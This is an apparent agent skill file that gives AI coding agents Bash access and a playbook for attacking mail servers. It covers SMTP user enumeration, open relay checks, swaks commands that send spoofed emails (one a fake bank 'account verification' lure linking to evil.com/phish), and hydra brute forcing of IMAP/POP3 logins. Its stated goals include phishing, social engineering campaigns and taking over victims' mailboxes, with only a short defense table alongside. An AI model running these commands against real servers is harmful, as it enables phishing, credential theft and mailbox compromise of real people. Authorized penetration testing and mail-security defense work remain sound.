---
name: email-protocol-attack
description: "Email protocol attacks targeting mail infrastructure at the protocol level."
origin: openclaw
version: "0.1.21"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: network-attack
  tool_count: 7
  guide_count: 3
  mitre: "T1114-Email Collection"
---



# Skill: Email Protocol Attack

> **Supplementary Files**:
> - `payloads.md` — Payload collection organized by 9 attack categories (SMTP enumeration, open relay, email forgery, SPF/DKIM/DMARC testing, IMAP brute force, Exchange attacks, header manipulation, TLS testing, fingerprinting)
> - `test-cases.md` — Structured test case templates (8 cases covering enumeration, relay, forgery, SPF bypass, DKIM testing, IMAP brute force, Exchange exploitation, STARTTLS downgrade)
> - `guides/smtp-enumeration-relay-guide.md` — SMTP reconnaissance and relay testing complete guide
> - `guides/email-forgery-spf-dkim-dmarc-guide.md` — Email forgery and authentication bypass guide
> - `guides/imap-exchange-attack-guide.md` — IMAP/POP3 and Exchange server attack guide

## Summary

Email Protocol Attack skill domain covering network attack operations.

**Tools**: smtp-user-enum, swaks, sendemail, nailgun, smtpmap, mutt, openssl

**Domain**: network-attack

**MITRE ATT&CK**: T1114-Email Collection

## Description

Email protocol attacks targeting mail infrastructure at the protocol level. This covers the full attack chain from SMTP reconnaissance (user enumeration, banner grabbing, open relay detection) through email forgery (SPF/DKIM/DMARC bypass, header manipulation) to mailbox compromise (IMAP/POP3 credential attacks, Exchange exploitation). The skill addresses both offensive techniques and corresponding defense strategies for Postfix, Sendmail, Exchange, and Dovecot servers.

## Use Cases

1. **Mail server reconnaissance** — Enumerate valid email accounts via SMTP VRFY/EXPN/RCPT TO commands, fingerprint mail server software and version
2. **Open relay detection** — Test whether a mail server accepts unauthorized relay, enabling spam propagation or phishing delivery
3. **Email forgery and phishing** — Craft spoofed emails at the protocol level, test SPF/DKIM/DMARC bypass techniques for social engineering campaigns
4. **Mailbox credential attacks** — Brute force or password spray IMAP/POP3/Exchange credentials to access victim mailboxes
5. **Exchange server exploitation** — Leverage Autodiscover, OWA, ActiveSync, and Exchange-specific vulnerabilities for credential harvesting and remote code execution
6. **TLS/STARTTLS testing** — Assess mail server TLS configuration, test for downgrade attacks and certificate validation weaknesses
7. **Email header manipulation** — Modify email headers for sender spoofing, routing manipulation, and anti-spam bypass

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **smtp-user-enum** | SMTP user enumeration via VRFY/EXPN/RCPT | `smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1` |
| **swaks** | Swiss Army Knife for SMTP testing, email forgery | `swaks --to victim@target.com --from spoofed@evil.com` |
| **sendemail** | Command-line email sending with TLS support | `sendemail -f attacker@evil.com -t victim@target.com -u "Subject" -m "Body"` |
| **nailgun** | High-performance SMTP stress testing and relay checking | `nailgun -h mail.target.com -p 25` |
| **smtpmap** | SMTP server fingerprinting and software detection | `smtpmap mail.target.com` |
| **mutt** | Terminal-based email client for IMAP/POP3 interaction | `mutt -f imaps://user:pass@mail.target.com/INBOX` |
| **openssl** | TLS/STARTTLS testing for SMTP and IMAP connections | `openssl s_client -starttls smtp -connect mail.target.com:25` |

## Methodology

### Attack Chain

```
Reconnaissance → Enumeration → Authentication Testing → Forgery/Phishing → Mailbox Access → Data Exfiltration
```

**1. Reconnaissance (Information Gathering)**
- Identify mail server via DNS MX records: `dig MX target.com`
- Banner grabbing: `nc mail.target.com 25`
- Software fingerprinting with smtpmap
- TLS configuration assessment

**2. Enumeration (User Discovery)**
- SMTP VRFY command: verify individual accounts
- SMTP EXPN command: expand mailing lists
- RCPT TO enumeration: test recipient validity
- Automated enumeration with smtp-user-enum

**3. Authentication Testing (Relay and Credential)**
- Open relay testing: attempt to send through target server without authentication
- Credential brute force against IMAP/POP3
- Exchange Autodiscover and OWA probing
- Password spraying with common passwords

**4. Forgery and Phishing (Email Protocol Attacks)**
- SPF bypass: IP-based, header manipulation, include chain exploitation
- DKIM signature testing: selector enumeration, key length analysis
- DMARC policy testing: p=none exploitation, subdomain bypass
- Email header manipulation for sender spoofing

**5. Mailbox Access (Post-Exploitation)**
- IMAP/POP3 credential reuse from breached databases
- Exchange ActiveSync and EWS exploitation
- Email forwarding rule manipulation
- Email collection and data exfiltration

### Defense Perspective

| Defense Measure | Description | Priority |
|-----------------|-------------|----------|
| SPF/DKIM/DMARC Deployment | Publish strict SPF records, sign with DKIM, enforce DMARC p=reject | CRITICAL |
| Disable VRFY/EXPN | Turn off SMTP verification commands to prevent user enumeration | HIGH |
| TLS Enforcement | Require TLS for all mail submission (port 587) and server-to-server transport | HIGH |
| Authentication Policies | Require strong authentication, implement account lockout and rate limiting | HIGH |
| Open Relay Prevention | Configure mail server to reject unauthenticated relay strictly | CRITICAL |
| Email Filtering | Deploy content filters, attachment scanning, and URL rewriting | MEDIUM |
| Monitoring and Logging | Log all SMTP sessions, alert on enumeration attempts and relay abuse | MEDIUM |

## Practical Steps

> **See payloads.md for detailed payloads, and test-cases.md for complete test checklist.** Below is a summary of core operations at each stage.

### Step 1: Mail Server Reconnaissance

```bash
# Query MX records
dig MX target.com +short

# Banner grabbing
nc mail.target.com 25

# Fingerprint mail server
smtpmap mail.target.com

# Full port scan for mail services
nmap -sV -p 25,110,143,465,587,993,995,2525 target.com
```

### Step 2: User Enumeration

```bash
# VRFY method
smtp-user-enum -M VRFY -U /usr/share/wordlists/usernames.txt -t mail.target.com

# RCPT TO method
smtp-user-enum -M RCPT -U /usr/share/wordlists/usernames.txt -t mail.target.com

# EXPN method
smtp-user-enum -M EXPN -U /usr/share/wordlists/usernames.txt -t mail.target.com
```

### Step 3: Email Forgery Testing

```bash
# Basic spoofed email
swaks --to ceo@target.com --from support@bank.com --server mail.target.com \
  --header "Subject: Urgent Account Verification" \
  --body "Please verify your account at http://evil.com/phish"

# Test SPF handling
swaks --to test@target.com --from spoofed@external.com --server mail.target.com

# Test with custom headers
swaks --to victim@target.com --from admin@target.com \
  --add-header "X-Priority: 1" \
  --add-header "Reply-To: attacker@evil.com"
```

### Step 4: TLS Configuration Assessment

```bash
# Test STARTTLS on SMTP
openssl s_client -starttls smtp -connect mail.target.com:25 -showcerts

# Test IMAPS
openssl s_client -connect mail.target.com:993 -showcerts

# Test POP3S
openssl s_client -connect mail.target.com:995 -showcerts

# Check certificate validity and cipher suites
openssl s_client -starttls smtp -connect mail.target.com:25 2>/dev/null | openssl x509 -noout -dates -subject
```

### Step 5: IMAP/POP3 Credential Testing

```bash
# IMAP login test with mutt
mutt -f imaps://testuser:password@mail.target.com/INBOX

# Brute force with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt mail.target.com imap

# POP3 credential testing
hydra -l admin -P /usr/share/wordlists/rockyou.txt mail.target.com pop3
```

## Hacker Laws

1. **Trust but Verify** — Never trust email headers. Sender addresses, Reply-To fields, and routing information can all be forged at the protocol level. Verify mail authentication (SPF/DKIM/DMARC) independently.

2. **First Principles** — SMTP was designed for a trusted network without authentication. Understanding the protocol's original design (clear-text, no built-in security) explains every attack vector from enumeration to forgery.

3. **Divergent Thinking** — When direct email delivery is blocked, explore alternative paths: open relay through third-party servers, subdomain SPF misconfigurations, DKIM key length weaknesses, or DMARC subdomain policy gaps.

4. **Economy of Mechanism** — Simpler mail security is more reliable. A properly configured SPF + DKIM + DMARC chain with p=reject is more effective than complex content filtering rules that try to detect forged emails after acceptance.

## Learning Resources

**Skill supplementary files**:
- `payloads.md` — Complete payload collection (9 attack categories, ready to copy and use)
- `test-cases.md` — Structured test cases (8 case templates, with prerequisites and expected results)
- `guides/smtp-enumeration-relay-guide.md` — SMTP enumeration and relay testing guide
- `guides/email-forgery-spf-dkim-dmarc-guide.md` — Email forgery and authentication bypass guide
- `guides/imap-exchange-attack-guide.md` — IMAP/Exchange server attack guide

**Related Skills**:
- `skills/network-pentest/SKILL.md` — Network penetration testing foundation
- `skills/social-engineering/SKILL.md` — Social engineering and phishing campaigns
- `skills/password-attack/SKILL.md` — Password attack techniques for credential testing
- `skills/recon-osint/SKILL.md` — Open source intelligence for email harvesting

**External Resources**:
- [RFC 5321 - SMTP Protocol](https://tools.ietf.org/html/rfc5321)
- [RFC 7208 - SPF Protocol](https://tools.ietf.org/html/rfc7208)
- [RFC 6376 - DKIM Signatures](https://tools.ietf.org/html/rfc6376)
- [RFC 7489 - DMARC](https://tools.ietf.org/html/rfc7489)
- [OWASP Email Security Testing](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks - Pentesting SMTP](https://book.hacktricks.xyz/pentesting/pentesting-smtp)
- [swaks Documentation](https://github.com/jetmore/swaks)
